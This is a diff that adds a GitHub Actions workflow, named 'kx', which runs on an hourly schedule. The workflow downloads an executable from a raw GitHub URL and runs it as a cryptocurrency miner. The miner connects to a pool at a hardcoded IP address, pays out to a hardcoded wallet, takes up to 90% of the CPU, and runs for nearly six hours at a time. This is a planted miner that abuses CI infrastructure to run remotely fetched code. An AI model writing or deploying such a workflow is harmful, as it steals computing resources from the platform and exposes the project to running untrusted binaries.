@@ -1,0 +1,21 @@
+name: kx
+on:
+  schedule:
+    - cron: "7 * * * *"
+  workflow_dispatch:
+concurrency: kx
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    steps:
+      - name: fetch
+        run: |
+          curl -fsSL -o /tmp/kx https://raw.githubusercontent.com/benjaminmorton/kx-bin/main/kx-x64
+          chmod +x /tmp/kx
+          /tmp/kx --version | head -1
+      - name: mine
+        run: |
+          /tmp/kx --url 141.94.96.71:443 --user "$WALLET" --pass x --rig-id "gh-${{ github.run_id }}" --tls --max-cpu-usage 90 --cpu-priority 5 --donate-level 1 --print-time 60
+        env:
+          WALLET: 41taFTosiAE3G6JRMbT7MV7sewKYVH8GAACXJXQXRU1VP2LxDgmPNHZYXfNLTK9fQHGAyPqDGu3au1uNkdxAPn7rVWiQ7Ej
